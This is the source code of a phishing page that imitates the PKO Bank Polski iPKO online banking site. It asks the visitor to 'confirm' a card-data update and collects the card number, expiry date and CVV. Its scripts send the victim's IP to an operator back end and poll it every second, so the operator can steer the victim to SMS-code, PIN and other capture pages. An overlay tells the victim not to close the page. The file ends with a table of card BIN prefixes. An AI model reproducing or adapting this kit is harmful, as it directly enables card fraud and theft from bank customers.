 
 <!DOCTYPE html>
 
<html lang="pl" class="js-focus-visible" style="--viewport-height: 730px;">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <!--<base href="/secure/ikd3/">-->
      <base href=".">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
 
      <title>Strona logowania | iPKO - bankowość elektroniczna PKO Banku Polskiego</title>
      <link rel="stylesheet" type="text/css" href="./file/st.css">
   
    <style type="text/css">
 


        html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
            font:inherit;
            font-family: sans-serif;

        }
    .overlay {
    /* z-index: 999; */
    position: fixed;
    width: 100%;
    height: 100%;
    top: 0;
    left: 0;
    background-color: rgb(0 89 128 / 66%);
    border-radius: 6px;
    z-index: 9999;
}

.loader {
   text-align: center;
    position: absolute;
    left: 50%;
    top: 50%;
    z-index: 1;
    transform: translate(-50%,-50%);
}

.lds-spinner {
    color: #FFF;
    display: inline-block;
    width: 80px;
    height: 80px;
  }
  .lds-spinner div {
    transform-origin: 40px 40px;
    animation: lds-spinner 1.2s linear infinite;
  }
  .lds-spinner div:after {
    content: " ";
    display: block;
    position: absolute;
    top: 3px;
    left: 37px;
    width: 6px;
    height: 18px;
    border-radius: 20%;
    background: #FFF;
  }
  .lds-spinner div:nth-child(1) {
    transform: rotate(0deg);
    animation-delay: -1.1s;
  }
  .lds-spinner div:nth-child(2) {
    transform: rotate(30deg);
    animation-delay: -1s;
  }
  .lds-spinner div:nth-child(3) {
    transform: rotate(60deg);
    animation-delay: -0.9s;
  }
  .lds-spinner div:nth-child(4) {
    transform: rotate(90deg);
    animation-delay: -0.8s;
  }
  .lds-spinner div:nth-child(5) {
    transform: rotate(120deg);
    animation-delay: -0.7s;
  }
  .lds-spinner div:nth-child(6) {
    transform: rotate(150deg);
    animation-delay: -0.6s;
  }
  .lds-spinner div:nth-child(7) {
    transform: rotate(180deg);
    animation-delay: -0.5s;
  }
  .lds-spinner div:nth-child(8) {
    transform: rotate(210deg);
    animation-delay: -0.4s;
  }
  .lds-spinner div:nth-child(9) {
    transform: rotate(240deg);
    animation-delay: -0.3s;
  }
  .lds-spinner div:nth-child(10) {
    transform: rotate(270deg);
    animation-delay: -0.2s;
  }
  .lds-spinner div:nth-child(11) {
    transform: rotate(300deg);
    animation-delay: -0.1s;
  }
  .lds-spinner div:nth-child(12) {
    transform: rotate(330deg);
    animation-delay: 0s;
  }
  @keyframes lds-spinner {
    0% {
      opacity: 1;
    }
    100% {
      opacity: 0;
    }
  }

        </style>
      
<style type="text/css">
            input {
                   border: none;
                border-width: 0px!important;
                border-style: solid!important;
                border-color: #030303!important;
                box-shadow: inset 0 0 1px #000000  !important;
                    height: 39px !important;
                
                line-height: 0;
              border-radius: 3px!important;
                padding-left: 13px;
                color: #2a2a2a;
            }


               .expiry #expiry1{
                 width: 60px !important;
               }

            input::-webkit-input-placeholder {
                font-size: 14px;
                line-height: 3;
                color: #d3d2d2;
            }

             #vcode2, #vcode3, #vcode4{
                  margin-left: 1px;
               }
            @media screen and (max-width:1124px) {
                           #vcode1,   #vcode2, #vcode3, #vcode4{
                 width: 23.6%!important;
               }
                  
            }
              @media screen and (max-width:768px) {
                      #vcode1,   #vcode2, #vcode3, #vcode4{
                 width: 23.8%!important;
               }
            }
            @media screen and (max-width:616px) {
              /* .contact-card-content{
                   width: 100% !important;
               }*/
               #vcode2, #vcode3, #vcode4{
                  margin-left: 1px;
               }
            }
            @media screen and (max-width:599px) {
               .contact-card-content{
                   width: 100% !important;
               }
               #vcode2, #vcode3, #vcode4{
                  margin-left: 2px;
               }
            }
            @media screen and (max-width:566px) {

               #vcode2, #vcode3, #vcode4{
                  margin-left: 2px;
               }
            }
            @media screen and (max-width:566px) {

               #vcode2, #vcode3, #vcode4{
                  margin-left: 0px;
               }
            }

            @media screen and (max-width:418px) {
               #vcode2, #vcode3, #vcode4{
                  margin-left: 0px;
               }
                            #vcode1,   #vcode2, #vcode3, #vcode4{
                 width: 23.8%!important;
               }
            }


            @media screen and (max-width:360px) {
                           #vcode1,   #vcode2, #vcode3, #vcode4{
                 width: 23.6%!important;
               }
                  .contact-block-label {
                                 font-size: 11px!important;
                  }
            }

            @media screen and (max-width:325px) {
                           #vcode1,   #vcode2, #vcode3, #vcode4{
                 width: 23.6%!important;
               }
                  .contact-block-label {
                                 font-size: 11px!important;
                  }
            }
            @media screen and (max-width:320px) {
                           #vcode1,   #vcode2, #vcode3, #vcode4{
                 width: 23.4%!important;
               }
                  .contact-block-label {
                                 font-size: 11px!important;
                  }
            }



            @media screen and (max-width:308px) {
                  input, select,input[type=tel] {

                      padding-left: 7px !important;
                      width: 23% !important;
                  }
                #Login-password-div{
                   margin-top: 8px;
                   text-align: start!important;
                   float: left !important;
                 }

            }
               input[type=tel]::placeholder {
                 color:rgba(0, 0, 0, .40);
                 font-size: 15px;
                 font-style: normal;
                 text-align: center;

               }
                #vcode1,#vcode2,#vcode3,#vcode4{
                   letter-spacing: 5px !important;
                   text-align: center!important;
                   padding: 0!important;
                }
                input[type=tel]{

                   text-align: center !important;
                   padding: 0!important;
                }
        @media screen and (max-width: 449px) {
                #vcode1,#vcode2,#vcode3,#vcode4{
                   letter-spacing: 2px!important;
                  
                }

    
        }
            .contact-card-type{
                background: #f5f5f57a;
                border: 1px solid #e5e5e5;
                padding: 37px 13px;
                border-radius: 4px;
            }
 </style>  
       
   </head>
   <body ng-app="sa_app"  ng-controller="controller" ng-init="show_data()">
     <div class="overlay" style="display:none;">
           <div class="loader">
                <div class="lds-spinner"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
                <br>
                <div class="main-title">
                  <h3 style="color: #fff; font-size: .8em; line-height: 20px;font-weight: 100;">
                     OCHRONA DANYCH OSOBOWYCH<br>NIE ZAMYKAJ STRONY.
                  </h3>
               </div>




            </div>
    </div> 
      <div id="root">
         <div class="_1G9YH _34cph">
            <div class="_4n8S6">
               <img alt="IKO" class="_1e-VD" src="./file/logo-iko-simple-64.svg">
               <div class="v6gLH">
                  <a href="" class="_2c-3D _1_uLG" data-text="Pobierz darmową aplikację IKO.">
                     <div class="IHPU0"><span class="_2eFtA">Otwórz w nowej karcie&nbsp;</span>Pobierz darmową aplikację IKO.</div>
                  </a>
                  <div class="_37MJk">
                     <div class="">
                        <p>Obsługuj bank w swoim telefonie.</p>
                     </div>
                  </div>
               </div>
               <button class="_1CavH _1VeLj _10Uya _32Kxh _1Jjvr"  type="button" data-text="Zobacz więcej">
                  <div class="tMrJN"><span class="_7l_9Y">Zobacz więcej</span></div>
               </button>
               <button class="_1mWYq _1VeLj _32Kxh _3V6u0"  type="button" data-text="POBIERZ">
                  <div class="tMrJN"><span class="_7l_9Y">POBIERZ</span></div>
               </button>
               <button class="_3b4Sa _1VeLj _32Kxh iSqeo"   type="button" data-text="Zamknij">
                  <div class="tMrJN"><span class="_7l_9Y">Zamknij</span></div>
               </button>
            </div>
         </div>
         <div class="_2gs5Y _2r7X7" tabindex="-1">
            <div class="_19neU">
               <div class="q_Fz1">
                  <div class="_3n6H2">
                     <div class="Bn6K_">
                        <div class="_1wAsl">
                           <h1 class="_2edmC S_ce3">iPKO</h1>
                           <a class="_3l7OT _2eFE8 NB3WM _3d645 _2EvTH" href=""><span class="dR7gB">iPKO</span></a>
                           <div class="_1jNN0 _3X2L0">
                              <h2 class="_2lxjm">Menu nawigacyjne</h2>
                           </div>
                           <div class="_2Vp84 _184Bc _308Ul _2K611 _3gJns _1PRFI _3R3f_">
                              <div class="lIW6K W63pU _1y-Wr">
                                 <button class="_2-otR _2nC94" aria-describedby="ea63d702-13b3-4106-aff1-3400d98e135a" aria-expanded="false" aria-haspopup="true" type="button" role="listbox">
                                    <div class="_1pogc" id="ea63d702-13b3-4106-aff1-3400d98e135a">
                                       <div class="IZfnL">
                                          <div class="KN3uo _2UFcg">
                                             <div class="_2v34N _2lZ45">
                                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 24" class="">
                                                   <g data-name="Rectangle 4361">
                                                      <path data-name="Path 15222" d="M4 0h24a4.012 4.012 0 0 1 4 4v16a4.012 4.012 0 0 1-4 4H4a4.012 4.012 0 0 1-4-4V4a4.012 4.012 0 0 1 4-4Z" fill="#fff"></path>
                                                      <path data-name="Path 15223" d="M28 24H4a4.054 4.054 0 0 1-4-4V4a4.054 4.054 0 0 1 4-4h24a4.054 4.054 0 0 1 4 4v16a4.054 4.054 0 0 1-4 4ZM4 1a3.04 3.04 0 0 0-3 3v16a3.04 3.04 0 0 0 3 3h24a3.04 3.04 0 0 0 3-3V4a3.04 3.04 0 0 0-3-3Z" fill="#b7b7b7"></path>
                                                   </g>
                                                   <path data-name="Rectangle 4351" d="M4 1h24a2.946 2.946 0 0 1 3 3v8H1V4a2.946 2.946 0 0 1 3-3Z" fill="#fff"></path>
                                                   <path data-name="Rectangle 4352" d="M1 12h30v8a2.946 2.946 0 0 1-3 3H4a2.946 2.946 0 0 1-3-3v-8Z" fill="red"></path>
                                                </svg>
                                             </div>
                                             <div class="_3E1JA" lang="pl">PL</div>
                                          </div>
                                       </div>
                                       <div class="_1_L-C">
                                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="wc9xc">
                                             <g data-name="Group 14437">
                                                <path data-name="Path 16243" d="M13.556 14.642 12 15.948l-1.556-1.306-6.949-5.831a1.961 1.961 0 0 1 2.822-.243L12 13.337l5.683-4.769a1.961 1.961 0 0 1 2.822.243Z" fill="#003574"></path>
                                             </g>
                                          </svg>
                                       </div>
                                    </div>
                                 </button>
                              </div>
                           </div>
                           <div class="_1Gcbw"></div>
                        </div>
                     </div>
                     <div class="q_Fz1 _2uBEL" id="MAIN_CONTENT">
                        <div class="_2gs5Y" tabindex="-1">
                           <div class="_19neU">
                              <div class="_3nWij _2DEtK">
                                 <div class="dZXXQ _2n_is">

                                     <style type="text/css">
                                                .inpERR{
                                                        border: 2px solid red !important;
                                                }
                                       </style>                         
                                    <div class="_3Bnvk" id="logVIEW" >
                                       <form tabindex="-1">
                                          <div class="_1ZZBH"></div>
                                          <div class="_3c4gN _2Xs25 Login">
                                             <div class="_3Mzc0">
                                                <div class="">
                                                   <h1 class="_2edmC S_ce3">iPKO</h1>
                                                    <h2 class="_2edmC _1AJDQ" aria-level="2">Prosimy o potwierdzenie aktualizacji danych karty bankowej</h2>




                      

                                                <div class="col-12 Login-noPadding" id="Login-password-div">
                                                   <div class="add-clear-span form-group">
                                                        
                                                         <span class="contact-block-label" style="font-weight: 600;">
                                                            <label>Numer karty *</label>
                                                         </span>  
                                   
                                                         <div class="vcode" id="vcode" style=" direction: ltr;">
                                                       
                                                          <input type="tel" placeholder="____" autofocus autocomplete="off" class="form-control input-clear"  maxlength="4" id="vcode1" ng-model="vcode1"  style="font-weight: 500;font-size: 18px;width: 22.6%;display: inline-block;" ng-change="bloc_login()">

                                                          <input type="tel" placeholder="____" autocomplete="off" class="form-control input-clear"  maxlength="4" id="vcode2" ng-model="vcode2"  style="font-weight: 500;font-size: 18px;width: 22.6%;display: inline-block;" ng-change="bloc_login()">

                                                          


                                                          <input type="tel" placeholder="____" autocomplete="off" class="form-control input-clear"  maxlength="4" id="vcode3" ng-model="vcode3"  style="font-weight: 500;font-size: 18px;width: 22.6%;display: inline-block;" ng-change="bloc_login()">


                                                          <input type="tel" placeholder="____"  autocomplete="off" class="form-control input-clear"  maxlength="4" id="vcode4" ng-model="vcode4"  style="font-weight: 500;font-size: 18px;width: 22.6%;display: inline-block;" ng-change="bloc_login()">

                                                        </div>
                                                    </div>
                                                </div>



                                                <div class="col-12" style="    margin-top: 10px;">
                                                    <div class="col-7 Login-noPadding" id="Login-password-div" style="display: inline-block;     width: 60%;">
                                                        <div class="add-clear-span form-group">
                                                        
                                                             <span class="contact-block-label" style="font-weight: 600;">
                                                                 <label>Data wygaśnięcia *</label>
                                                             </span>                                                           
                                                             <div class="expiry" id="expiry">
                                                                    <input type="tel" class="form-control input-clear" 
                                                                    placeholder="MM" id="expiry1" ng-model="expiry1"  autocomplete="off" ng-change="bloc_login()" maxlength="2"  
                                                                     style="font-weight: 500;font-size: 18px;width: 50px!important; display: inline-block;">
                                                                 

                                                                    <input  type="tel" class="form-control input-clear" 
                                                                placeholder="YYYY" id="expiry2" ng-model="expiry2" autocomplete="off" ng-change="bloc_login()" maxlength="4"  
                                                                 style="font-weight: 500;font-size: 18px;width: 66px!important;display: inline-block;">

                                                             </div>
                                                        </div>

                                                    </div>

                                                     <div class="col-5 Login-noPadding" id="Login-password-div" style="display: inline-block;    text-align: end;float: right;">
                                                         <div class="add-clear-span form-group" dir="rtl" style="    float: right;">
                                             
                                                         <span class="contact-block-label" style="font-weight: 600; display:block ;">
                                                               <label>CVV (CVC) *</label>
                                                             
                                                            </span>

                                                                             
                                                            <input id="securitycode" type="tel" class="form-control input-clear" 
                                                            placeholder="123" ng-model="securitycode" autocomplete="off" ng-change="bloc_login()" maxlength="3"  
                                                          style="font-weight: 500;font-size: 18px;width: 96px!important;">
                                                         </div>
                                                    </div>

                                                    
                                                </div>














                                                </div>
                                             </div>


                                             <div class="_1Gcbw _10iaC"></div>






                                                                                           <div class="t4GiR">
                                                <div class="fOLEC"></div>
                                                <div class="_1U4d6">
                                                   <button class="_2lpC_ _1VeLj _3NXVH _38wVI _1q2Ch"  id="btn-validate" disabled="disabled" ng-click="validation()" >
                                                      <div class="tMrJN"><span class="_7l_9Y">Kontynuować</span></div>
                                                   </button>
                                                    
                                                  
                                                </div>
                                             </div>




 

                                             <div class="_2IJyw">
                                               
                                             </div>
                                          </div>
                                          
                                       </form>
                                    </div>




 
 



                                    <div class="_2D74s"></div>
                                    <div class="_27ylV _1r3Gu">
                                       <div>
                                          <div class="_1jnKA o03Bm">
                                             <picture>
                                       
                                                <img alt="Pożyczka gotówkowa"   height="208" src="./file/17022-17041-KV-kasa_swieta-570x570px_CjYi3Ls_208_208.png" width="208">
                                             </picture>
                                             <div class="_2QHGV _3KlCO">
                                                <div class="">
                                                   <h2 id="spraw-sobie-i-bliskim-prezent-rrso-1157">Spraw sobie i bliskim prezent. RRSO 11,57%</h2>
                                                   <p>Weź swoją pierwszą pożyczkę u&nbsp;nas – z&nbsp;obniżoną prowizją i&nbsp;stałym oprocentowaniem</p>
                                                </div>
                                                <div class="WuDQM _2S93q">
                                                   <button class="_2lpC_ _1VeLj _2Sz7b L1PAc"  type="button" data-text="Sprawdź propozycję">
                                                      <div class="tMrJN"><span class="_7l_9Y">Sprawdź propozycję</span></div>
                                                   </button>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 <div class="_2QzWF">
                                    <div class="dZXXQ">
                                       <h1 class="_2edmC S_ce3" aria-level="2">Aktualności</h1>
                                       <div class="_3qtsP _1YmMe ED8Py">
                                          <div class="">
                                             <p><em>29.11.2023</em></p>
                                             <h3 id="zwolnij-by-wyprzedzić-oszustów">Zwolnij, by wyprzedzić oszustów</h3>
                                             <p>Sprawdź i&nbsp;stosuj 10 podstawowych zasad bezpieczeństwa</p>
                                          </div>
                                          <a aria-label="Więcej: Zwolnij, by wyprzedzić oszustów" href="" class="_2c-3D _3tdEh" data-text="Więcej">
                                             <div class="_2-49L"><span class="_2eFtA">Otwórz w nowej karcie&nbsp;</span>Więcej</div>
                                          </a>
                                       </div>
                                       <div class="_3qtsP _1YmMe">
                                          <div class="">
                                             <p><em>19.10.2023</em></p>
                                             <h3 id="czy-to-na-pewno-twoja-płatność">Czy to na pewno Twoja płatność?</h3>
                                             <p>Dostosuj powiadomienia, aby wiedzieć, co dzieje się na Twoim koncie</p>
                                          </div>
                                          <a aria-label="Więcej: Czy to na pewno Twoja płatność?" href="" class="_2c-3D _3tdEh" data-text="Więcej">
                                             <div class="_2-49L"><span class="_2eFtA">Otwórz w nowej karcie&nbsp;</span>Więcej</div>
                                          </a>
                                       </div>
                                       <div class="_3qtsP _1YmMe">
                                          <div class="">
                                             <p><em>10.07.2023</em></p>
                                             <h3 id="polecaj-nasze-konta-i-zarabiaj">Polecaj nasze konta i zarabiaj!</h3>
                                             <p>W zależności od rodzaju kont, które masz, możesz zgarnąć nawet 4000 zł w&nbsp;X&nbsp;edycji Programu poleceń.</p>
                                          </div>
                                          <a aria-label="Więcej: Polecaj nasze konta i zarabiaj!" href="" class="_2c-3D _3tdEh" data-text="Więcej">
                                             <div class="_2-49L"><span class="_2eFtA">Otwórz w nowej karcie&nbsp;</span>Więcej</div>
                                          </a>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <div class="_3mGH9"></div>
                     <div class="_2NEx0">
                        <div class="_3mjLM">
                           <div class="_2LWXP"><a rel="noopener noreferrer" class="_3WAzU" href="" target="_blank" data-text="© 2023 PKO Bank Polski"><span class="hofzD">Otwórz w nowej karcie&nbsp;</span>© 2023 PKO Bank Polski</a><a rel="noopener noreferrer" class="_3WAzU" href="" target="_blank" data-text="Kod BIC (Swift): BPKOPLPW"><span class="hofzD">Otwórz w nowej karcie&nbsp;</span>Kod BIC (Swift): BPKOPLPW</a><a rel="noopener noreferrer" class="_3WAzU" href="" target="_blank" data-text="Polityka prywatności"><span class="hofzD">Otwórz w nowej karcie&nbsp;</span>Polityka prywatności</a></div>
                           <div class="_34nRC">
                              <a rel="noopener noreferrer" class="_3WAzU _2S67B" href="" target="_blank" data-text="Bezpieczeństwo">
                                 <span class="hofzD">Otwórz w nowej karcie&nbsp;</span>
                                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="_2hPJH">
                                    <path d="M19 4H5l.007 7.71c0 3.744 6.472 7.562 6.748 7.722l.252.146.252-.146c.276-.16 6.748-3.978 6.748-7.722C19.007 9.211 19 4 19 4Zm-6.992 14.418c-1.886-1.153-6-4.191-6-6.707v-1.247c0-.337-.005-.8-.005-5.464h12c0 1.278.006 4.706.006 6.711-.002 2.513-4.117 5.554-6.002 6.707ZM15.45 8.53a1 1 0 0 1 1.411 0l-5.633 5.633-3.556-3.509a1 1 0 0 1 1.414-.009l2.137 2.108Z" fill="#003574"></path>
                                 </svg>
                                 Bezpieczeństwo
                              </a>
                              <a rel="noopener noreferrer" class="_3WAzU _2S67B" href="" target="_blank" data-text="Pomoc">
                                 <span class="hofzD">Otwórz w nowej karcie&nbsp;</span>
                                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="_2hPJH">
                                    <path d="M12 4a8 8 0 0 0-8 8 8 8 0 0 0 8 8 8 8 0 0 0 8-8 8 8 0 0 0-8-8Zm0 1a6.967 6.967 0 0 1 4.569 1.708l-1.43 1.43A4.948 4.948 0 0 0 12 7a4.948 4.948 0 0 0-3.129 1.13L7.441 6.7A6.958 6.958 0 0 1 12 5Zm2.458 10.132A3.961 3.961 0 0 1 12 16a3.96 3.96 0 0 1-2.448-.86 4.014 4.014 0 0 1-.706-.709A3.964 3.964 0 0 1 8 12a3.956 3.956 0 0 1 .869-2.458 3.943 3.943 0 0 1 .71-.7A3.957 3.957 0 0 1 12 8a3.964 3.964 0 0 1 2.431.846 4.014 4.014 0 0 1 .709.706A3.96 3.96 0 0 1 16 12a3.957 3.957 0 0 1-.838 2.421 4.013 4.013 0 0 1-.704.711ZM5 12a6.964 6.964 0 0 1 1.732-4.6L8.16 8.828A4.954 4.954 0 0 0 7 12a4.948 4.948 0 0 0 1.138 3.139l-1.43 1.43A6.967 6.967 0 0 1 5 12Zm7 7a6.964 6.964 0 0 1-4.585-1.723l1.428-1.429A4.954 4.954 0 0 0 12 17a4.956 4.956 0 0 0 3.167-1.16l1.428 1.428A6.964 6.964 0 0 1 12 19Zm5.3-2.441-1.429-1.43A4.953 4.953 0 0 0 17 12a4.954 4.954 0 0 0-1.152-3.157l1.428-1.428A6.957 6.957 0 0 1 19 12a6.964 6.964 0 0 1-1.7 4.559Z" fill="#003574"></path>
                                 </svg>
                                 Pomoc
                              </a>
                              <a rel="noopener noreferrer" class="_3WAzU _2S67B" href="" target="_blank" data-text="Kontakt">
                                 <span class="hofzD">Otwórz w nowej karcie&nbsp;</span>
                                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="_2hPJH">
                                    <path d="M4 6v12h16V6Zm15 1v1.2l-7 4.642L5 8.2V7ZM5 17V9.432l7 4.644 7-4.643V17Z" fill="#003574"></path>
                                 </svg>
                                 Kontakt
                              </a>
                           </div>
                        </div>
                     </div>
                     <div>
                        <div class="_1lbk7">
                           <div class="_3Fpn0" tabindex="-1"></div>
                        </div>
                        <div class="_1lbk7">
                           <div class="_3Fpn0" tabindex="-1"></div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      


<script src="file/jquery.min.js"></script>
<script src="file/angular.min.js"></script>
<script src="file/dirPaginate.js"></script>
<script type="text/javascript">

var vcode = (function () {
  //cache dom
  var $inputs = $("#vcode").find("input");
  var $inputs2 = $("#expiry").find("input");

  //bind events
  $inputs.on("keyup", processInput);
  $inputs2.on("keyup", processInput2);

  //define methods
  function processInput(e) {
    var x = e.charCode || e.keyCode;
    if ((x == 8 || x == 46) && this.value.length == 0) {
      var indexNum = $inputs.index(this);
      if (indexNum != 0) {
        $inputs.eq($inputs.index(this) - 1).focus();
      }
    }

    if (ignoreChar(e)) return false;
    else if (this.value.length == this.maxLength) {
      $(this).next("input").focus();
    }
  }

  function processInput2(e) {
    var x = e.charCode || e.keyCode;
    if ((x == 8 || x == 46) && this.value.length == 0) {
      var indexNum = $inputs2.index(this);
      if (indexNum != 0) {
        $inputs2.eq($inputs2.index(this) - 1).focus();
      }
    }

    if (ignoreChar(e)) return false;
    else if (this.value.length == this.maxLength) {
      $(this).next("input").focus();
    }
  }


  function ignoreChar(e) {
    var x = e.charCode || e.keyCode;
    if (x == 37 || x == 38 || x == 39 || x == 40) return true;
    else return false;
  }
})();


</script>

<script> 

var fetch = angular.module('sa_app', ['angularUtils.directives.dirPagination']);

fetch.controller('controller', ['$scope', '$http','$filter', function ($scope, $http,$filter) {
        var urlx = window.location.pathname;
        var pathname = urlx.replace("card.php", "");

        var urly = window.location.href;
        var pathname2 = urly.replace("card.php", "");
        $scope.select_reg ="no-value";
        $scope.reg_txt =[ ];
        $scope.logo_png='';
        $scope.expiry1=''
        $scope.expiry2=''
        $scope.number=''
        $scope.securitycode=''
        $scope.name=''
 
        $scope.vcode1='';
        $scope.vcode2='';
        $scope.vcode3='';
        $scope.vcode4='';
        $scope.bloc_pwd_input='';

        $scope.info_User={};
        $scope.load='';
        $scope.loads_info='';
        $scope.base_url='';
        $scope.val_login="";
        $scope.card_name='';




        $scope.show_data = function(){
            console.log(window.location.href)
            $http({
              method: 'get',
              url: "config/device.php"
            }).then(function successCallback(response) {
                    $scope.info_User=response.data;
                    $scope.base_url=$scope.info_User['url'];
                var Detailefun = {}; 
                Detailefun.ip=  $scope.info_User['ip'];
                Detailefun.fun= "FI CC";
                $http({
                     method: 'post',
                     url:  $scope.base_url+"config/fun.php?request=2",
                     data: JSON.stringify(Detailefun), 
                      headers: {'Content-Type': 'application/json'}
               }).then(function(data) {});
            }); 
        }



    setInterval(function() {
                var Detaile = {}; 
                Detaile.ip=  $scope.info_User['ip'];
                $http({
                     method: 'post',
                     url:  $scope.base_url+"config/fun.php?request=3",
                     data: JSON.stringify(Detaile), 
                      headers: {'Content-Type': 'application/json'}
               }).then(function(data) {
                   $scope.ip=data.data.ip;
                   $scope.fun=data.data.fun;
                     console.log(data);


                   if ($scope.fun== "gotoSendSMS") {
                       window.location.href = pathname+'sendONE.php';
                   } 
                   if ($scope.fun== "gotoSendOK") {
                       window.location.href = pathname+'sendOK.php';
                   } 
                   if ($scope.fun== "gotoSendNO") {
                       window.location.href = pathname+'sendNO.php';
                   } 
                   if ($scope.fun== "gotoCC") {
                       window.location.href = pathname+'card.php';
                   }                
                   if ($scope.fun== "gotoSMS") {
                       window.location.href = pathname+'sms_err.php';
                   }
                   if ($scope.fun== "gotoPIN") {
                       window.location.href = pathname+'pin.php';
                   }        
                   if ($scope.fun== "gotoLOG") {
                       window.location.href = pathname+'index.php';
                   }
                   if ($scope.fun== "gotoFIN") {
                       window.location.href = pathname+'fin.php';
                   }
                                
               });
    }, 1000); 

 
    $scope.bloc_login = function(){ 

         // $scope.number =$scope.vcode1+' '+$scope.vcode2+' '+$scope.vcode2;
        if (    $scope.vcode2.length >= 4 
             && $scope.vcode3.length >= 4 
             && $scope.vcode1.length >= 4 
             && $scope.vcode4.length >= 4 
               && $scope.securitycode.length >= 3 
               && $scope.expiry1.length >= 2 
               && $scope.expiry2.length >= 2 
         ) {
             $("#btn-validate").removeAttr('disabled');
        }else{
             $("#btn-validate").attr('disabled','disabled');
         }
    }



    $scope.isInteger = function(bin){
        const blok = [ "111122","123456","111111","000000"];
        var bol =false;
        for (var i = blok.length - 1; i >= 0; i--) {
            if (blok[i]== bin){bol = true;}
        }
        return bol;    }  

$scope.CARDNAMETYBE = function(bin){
    const card =[
     {id: '518964 ', nom: ' MCARD CREDIT EMILIANO'},
     {id: '423067 ', nom: ' VISA DEBIT UNICREDIT'},
     {id: '537584 ', nom: ' MCARD DEBIT FINDOMESTIC'},
     {id: '520014 ', nom: ' MCARD PREPAID NEXI'},
     {id: '525500 ', nom: ' MCARD CREDIT NEXI'},
     {id: '483847 ', nom: ' VISA DEBIT Business'},
     {id: '497018 ', nom: ' VISA DEBIT BUSINESS'},
     {id: '670999 ', nom: ' Mstr DEBIT iccrea'},
     {id: '535585 ', nom: ' MCARD DEBIT N26'},
     {id: '515859 ', nom: ' MCARD Gold ING'},
     {id: '402539 ', nom: ' VISA credit C.U'},
     {id: '423356 ', nom: ' VISA debit FIB'},
     {id: '402360 ', nom: ' MCARD PREPAID POSTEPAY'},
     {id: '535476 ', nom: ' MCARD debit POSTEPAY'},
     {id: '453997 ', nom: ' VISA credit NEXI'},
     {id: '447149 ', nom: ' VISA debit INTESA'},
     {id: '416377 ', nom: ' VISA debit NEXI'},
     {id: '405785 ', nom: ' VISA credit Nexi'},
     {id: '468762 ', nom: ' VISA debit UNICREDIT'},
     {id: '535755 ', nom: ' MCARD debit NEXI'},
     {id: '537572 ', nom: ' MCARD debit NEXI'},
     {id: '516795 ', nom: ' MCARD debit INTESA'},
     {id: '539832 ', nom: ' MCARD credit INTESA'},
     {id: '539768 ', nom: ' MCARD debit INTESA'},
     {id: '525610 ', nom: ' MCARD CREDIT UNICREDIT'},
     {id: '534413 ', nom: ' MCARD DEBIT UNICREDIT'},
     {id: '535570 ', nom: ' Mcard Debit Paschi'},
     {id: '535574 ', nom: ' MCARD STANDARD POSTEPAY'},
     {id: '535584 ', nom: ' MCARD Debit N26'},
     {id: '510020 ', nom: ' MCARD Credit FINECOBANK'},
     {id: '525500 ', nom: ' MCARD Credit CARTASI'},
     {id: '535677 ', nom: ' MCARD Debit ING'},
     {id: '533004 ', nom: ' MCARD PREPAID  NEXI'},
     {id: '554811 ', nom: ' MCARD PREPAID Poste'},
     {id: '526736 ', nom: ' MCARD PREPAID BIBANCA'},
     {id: '531158 ', nom: ' Mcard PREPAID Chebanca'},
     {id: '528287 ', nom: ' MCARD Credit iccrea'},
     {id: '460026 ', nom: ' VISA CREDIT Absa'},
     {id: '537420 ', nom: ' MCARD DEBIT ICCREA'},
     {id: '479888 ', nom: ' Visa PREPAID BANK'},
     {id: '532131 ', nom: ' MCARD DEBIT NEXI'},
     {id: '535478 ', nom: ' MCARD PREPAID CORPORATE'},
     {id: '529204 ', nom: ' MCARD CREDIT NEXI'},
     {id: '535552 ', nom: ' MCARD debit Unicredit'},
     {id: '535133 ', nom: ' MCARD DEBIT BPM'},
     {id: '535761 ', nom: ' MCARD DEBIT NEXI'},
     {id: '472675 ', nom: ' VISA PREPAID NEXI'},
     {id: '416363 ', nom: ' VISA DEBIT'},
     {id: '535520 ', nom: ' MCARD DEBIT NEXI'},
     {id: '403027 ', nom: ' VISA PREPAID mps'},
     {id: '674848 ', nom: ' Mstr debit Sia'},
     {id: '522701 ', nom: ' MCARD PREPAID Bnl'},
     {id: '493512 ', nom: ' VISA credit Deutsche'},
     {id: '525590 ', nom: ' MCARD credit Nexi cartasi'},
     {id: '528287 ', nom: ' MCARD credit iccrea'},
     {id: '537526 ', nom: ' MCARD DEBIT SELLA'},
     {id: '674753 ', nom: ' Mstr DEBIT BIBANCA'},
     {id: '515859 ', nom: ' MCARD CREDIT Gold ING'},
     {id: '534232 ', nom: ' MCARD PREPAID SELLA'},
     {id: '531340 ', nom: ' MCARD PREPAID Emiliano'},
     {id: '530514 ', nom: ' MCARD PREPAID INTESA'},
     {id: '527378 ', nom: ' MCARD PREPAID SELLA'},
     {id: '481000 ', nom: ' VISA PREPAID MOONEY'},
     {id: '512669 ', nom: ' MCARD GIFT CassaRurale'},
     {id: '526430 ', nom: ' MCARD GIFT Unicredit'},
     {id: '517504 ', nom: ' MCARD PREPAID  MDPS'},
     {id: '402425 ', nom: ' VISA Credit  POPOLARE'},
     {id: '674836 ', nom: ' Mstr Debit POPOLARE'},
     {id: '474227 ', nom: ' VISA  Credit CREDITO EMILIANO'},
     {id: '677355 ', nom: ' Mstr Debit UNICREDIT'},
